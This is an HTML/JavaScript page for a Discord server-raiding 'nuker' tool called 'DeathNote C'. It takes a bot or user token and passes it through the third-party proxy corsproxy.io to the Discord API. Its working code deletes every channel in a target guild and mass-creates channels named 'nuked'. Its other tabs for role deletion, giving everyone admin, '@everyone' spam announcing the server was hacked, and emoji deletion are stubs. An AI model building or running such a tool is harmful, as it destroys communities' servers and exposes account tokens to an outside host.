<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeathNote C</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        body { font-family: 'Cairo', sans-serif; background: #050505; color: #fff; }
        .glass { background: rgba(15, 15, 15, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(0, 255, 255, 0.1); }
        .active-tab { border-bottom: 2px solid #06b6d4; color: #06b6d4; }
    </style>
</head>
<body class="p-4">

    <!-- الهيدر -->
    <div class="flex justify-between items-center mb-6">
        <h1 class="text-xl font-bold text-cyan-500">DEATH NOTE C</h1>
        <div id="status" class="w-3 h-3 rounded-full bg-red-500"></div>
    </div>

    <!-- لوحة الدخول -->
    <div id="login-box" class="glass p-6 rounded-2xl">
        <h2 class="text-center text-cyan-400 text-lg font-bold mb-4">CONNECTION</h2>
        <select id="token-type" class="w-full bg-black/50 border border-cyan-900 p-3 rounded-xl mb-3 outline-none text-white">
            <option value="Bot">Bot</option>
            <option value="User">User</option>
        </select>
        <input type="password" id="token" placeholder="Paste token here..." class="w-full bg-black/50 border border-cyan-900 p-3 rounded-xl mb-4 outline-none text-white">
        <button onclick="login()" class="w-full bg-cyan-600 hover:bg-cyan-500 p-3 rounded-xl font-bold transition">CONNECT & SAVE</button>
    </div>

    <!-- لوحة التحكم الرئيسية -->
    <div id="main-panel" class="hidden space-y-4">
        <!-- اختيار السيرفر -->
        <div class="glass p-3 rounded-xl">
            <label class="text-xs text-cyan-400 block mb-1">SERVER ID</label>
            <input type="text" id="guild-id" placeholder="Enter Guild ID..." value="1521392110929051738" class="w-full bg-black/50 border border-cyan-900 p-2 rounded-lg text-sm outline-none text-white">
        </div>

        <!-- تبديل الأقسام -->
        <div class="flex gap-4 overflow-x-auto pb-2 text-sm font-bold text-gray-400">
            <button onclick="switchTab('channels')" id="btn-channels" class="active-tab">CHANNELS</button>
            <button onclick="switchTab('roles')" id="btn-roles">ROLES</button>
            <button onclick="switchTab('spam')" id="btn-spam">SPAM</button>
            <button onclick="switchTab('server')" id="btn-server">SERVER</button>
        </div>

        <!-- محتوى القسم -->
        <div class="glass p-4 rounded-xl space-y-3">
            <div id="tab-content">
                <!-- محتوى القنوات الافتراضي -->
                <h3 class="text-cyan-500 font-bold mb-2">CHANNELS MANAGEMENT</h3>
                <button onclick="deleteAllChannels()" class="w-full bg-red-900/20 border border-red-500 p-2 rounded-lg text-sm font-bold text-red-400 hover:bg-red-900/40">Delete All Channels</button>
                <input type="text" id="ch-name" placeholder="Channel Name" value="nuked" class="w-full bg-black/50 border border-gray-700 p-2 rounded-lg mt-3 outline-none text-white text-sm">
                <input type="number" id="ch-count" placeholder="Count" value="10" class="w-full bg-black/50 border border-gray-700 p-2 rounded-lg mt-2 outline-none text-white text-sm">
                <button onclick="createChannels()" class="w-full bg-cyan-600 hover:bg-cyan-500 p-2 rounded-lg mt-2 font-bold text-sm">CREATE CHANNELS</button>
            </div>
        </div>
        
        <!-- الكونسول لعرض الحالة -->
        <div class="bg-black/90 border border-gray-800 p-3 rounded-lg font-mono text-[11px] text-green-400 h-24 overflow-y-auto" id="log-box">
            [System] Waiting for actions...
        </div>

        <!-- زر الـ ALL -->
        <button onclick="alert('Execute All Settings!')" class="w-full bg-red-600 hover:bg-red-500 p-3 rounded-xl font-bold animate-pulse text-white">ALL SETTINGS (EXECUTE)</button>
    </div>

    <script>
        let globalToken = "";
        let authHeader = "";

        function log(msg) {
            const box = document.getElementById('log-box');
            box.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
            box.scrollTop = box.scrollHeight;
        }

        function login() {
            const tokenInput = document.getElementById('token').value.trim();
            const tokenType = document.getElementById('token-type').value;
            
            if(!tokenInput) {
                alert('الرجاء إدخال التوكن!');
                return;
            }

            globalToken = tokenInput;
            authHeader = tokenType === 'Bot' ? `Bot ${tokenInput}` : tokenInput;

            document.getElementById('login-box').classList.add('hidden');
            document.getElementById('main-panel').classList.remove('hidden');
            document.getElementById('status').className = 'w-3 h-3 rounded-full bg-green-500';
            log("Connected successfully as " + tokenType);
        }

        function switchTab(tab) {
            ['channels', 'roles', 'spam', 'server'].forEach(t => {
                document.getElementById('btn-' + t).classList.remove('active-tab', 'text-cyan-500');
                document.getElementById('btn-' + t).classList.add('text-gray-400');
            });
            document.getElementById('btn-' + tab).classList.add('active-tab', 'text-cyan-500');
            document.getElementById('btn-' + tab).classList.remove('text-gray-400');

            const content = document.getElementById('tab-content');
            if(tab === 'channels') {
                content.innerHTML = `
                    <h3 class="text-cyan-500 font-bold mb-2">CHANNELS MANAGEMENT</h3>
                    <button onclick="deleteAllChannels()" class="w-full bg-red-900/20 border border-red-500 p-2 rounded-lg text-sm font-bold text-red-400">Delete All Channels</button>
                    <input type="text" id="ch-name" placeholder="Channel Name" value="nuked" class="w-full bg-black/50 border border-gray-700 p-2 rounded-lg mt-3 outline-none text-white text-sm">
                    <input type="number" id="ch-count" placeholder="Count" value="10" class="w-full bg-black/50 border border-gray-700 p-2 rounded-lg mt-2 outline-none text-white text-sm">
                    <button onclick="createChannels()" class="w-full bg-cyan-600 p-2 rounded-lg mt-2 font-bold text-sm">CREATE CHANNELS</button>
                `;
            } else if(tab === 'roles') {
                content.innerHTML = `
                    <h3 class="text-cyan-500 font-bold mb-2">ROLES MANAGEMENT</h3>
                    <button onclick="alert('Delete Roles clicked')" class="w-full bg-red-900/20 border border-red-500 p-2 rounded-lg text-sm font-bold text-red-400 mb-2">Delete All Roles</button>
                    <button onclick="alert('Admin Roles clicked')" class="w-full bg-green-900/20 border border-green-500 p-2 rounded-lg text-sm font-bold text-green-400">Give Everyone Admin</button>
                `;
            } else if(tab === 'spam') {
                content.innerHTML = `
                    <h3 class="text-cyan-500 font-bold mb-2">SPAM SETTINGS</h3>
                    <textarea id="spam-msg" class="w-full bg-black/50 border border-gray-700 p-2 rounded-lg text-sm text-white outline-none" rows="2">تم التهكير @everyone</textarea>
                    <button onclick="alert('Spam started')" class="w-full bg-cyan-600 p-2 rounded-lg mt-2 font-bold text-sm">START SPAM</button>
                `;
            } else if(tab === 'server') {
                content.innerHTML = `
                    <h3 class="text-cyan-500 font-bold mb-2">SERVER SETTINGS</h3>
                    <button onclick="alert('Emojis deleted')" class="w-full bg-red-900/20 border border-red-500 p-2 rounded-lg text-sm font-bold text-red-400 mb-2">Delete All Emojis</button>
                    <input type="text" id="srv-name" placeholder="New Server Name" class="w-full bg-black/50 border border-gray-700 p-2 rounded-lg outline-none text-white text-sm">
                `;
            }
        }

        // الوظائف الفعلية للاتصال بـ Discord API عبر Proxy لتخطي CORS
        const proxy = "https://corsproxy.io/?";

        async function deleteAllChannels() {
            const guildId = document.getElementById('guild-id').value;
            if(!guildId) return alert("الرجاء إدخال آي دي السيرفر!");
            
            log("Fetching channels...");
            try {
                let res = await fetch(proxy + encodeURIComponent(`https://discord.com/api/v9/guilds/${guildId}/channels`), {
                    method: 'GET',
                    headers: { 'Authorization': authHeader }
                });
                if(!res.ok) throw new Error("فشل جلب القنوات، تأكد من التوكن أو الصلاحيات.");
                
                let channels = await res.json();
                log(`Found ${channels.length} channels. Deleting...`);

                for(let ch of channels) {
                    await fetch(proxy + encodeURIComponent(`https://discord.com/api/v9/channels/${ch.id}`), {
                        method: 'DELETE',
                        headers: { 'Authorization': authHeader }
                    });
                    log(`Deleted channel: ${ch.name}`);
                }
                alert("تم حذف جميع القنوات بنجاح!");
            } catch(err) {
                log("Error: " + err.message);
                alert("حدث خطأ: " + err.message);
            }
        }

        async function createChannels() {
            const guildId = document.getElementById('guild-id').value;
            const name = document.getElementById('ch-name').value;
            const count = parseInt(document.getElementById('ch-count').value);
            
            if(!guildId) return alert("الرجاء إدخال آي دي السيرفر!");

            log(`Creating ${count} channels...`);
            try {
                for(let i = 0; i < count; i++) {
                    await fetch(proxy + encodeURIComponent(`https://discord.com/api/v9/guilds/${guildId}/channels`), {
                        method: 'POST',
                        headers: { 
                            'Authorization': authHeader,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ name: name, type: 0 })
                    });
                    log(`Created channel: ${name} (${i+1}/${count})`);
                }
                alert("تم إنشاء القنوات بنجاح!");
            } catch(err) {
                log("Error: " + err.message);
                alert("حدث خطأ: " + err.message);
            }
        }
    </script>
</body>
</html>
